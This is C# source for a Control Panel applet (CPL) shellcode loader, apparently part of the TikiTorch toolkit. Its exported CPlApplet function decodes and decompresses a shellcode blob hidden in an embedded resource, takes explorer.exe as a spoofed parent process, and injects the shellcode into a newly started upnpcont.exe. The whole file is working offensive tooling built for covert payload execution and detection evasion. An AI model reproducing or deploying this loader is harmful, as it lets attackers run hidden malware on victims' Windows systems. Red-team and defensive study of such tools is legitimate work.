using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using TikiLoader;
using System.IO;
using System.Reflection;
using RGiesecke.DllExport;

public class TikiCpl
{
    private static string ExtractResource(string filename)
    {
        var assembly = Assembly.GetExecutingAssembly();
        var resourceName = filename;

        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        using (StreamReader reader = new StreamReader(stream))
        {
            string result = reader.ReadToEnd();
            return result;
        }

    }
    private delegate IntPtr GetPebDelegate();

    static byte[] Decompress(byte[] gzip)
    {
        using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(gzip),
            System.IO.Compression.CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (System.IO.MemoryStream memory = new System.IO.MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    public static int FindProcessPid(string process)
    {
        int pid = 0;

        int session = Process.GetCurrentProcess().SessionId;

        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }
        return pid;
    }

    [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
    public unsafe static IntPtr CPlApplet()
    {

        string scode = ExtractResource("TikiCpl.Resource.txt");
        byte[] blob = Convert.FromBase64String(scode);
        byte[] shellcode = Decompress(blob);

        if (shellcode.Length == 0) return IntPtr.Zero;
            int ppid = FindProcessPid("explorer");
            if (ppid == 0)
            {
                Environment.Exit(1);
            }

            var ldr = new Loader();

        try
        {
            // Change the binary you want to inject shellcode into
            string binary = "C:\\windows\\system32\\upnpcont.exe";
            ldr.Load(binary, shellcode, ppid);
            return IntPtr.Zero;
        }
        catch
        {
            return IntPtr.Zero;
        }

    }
}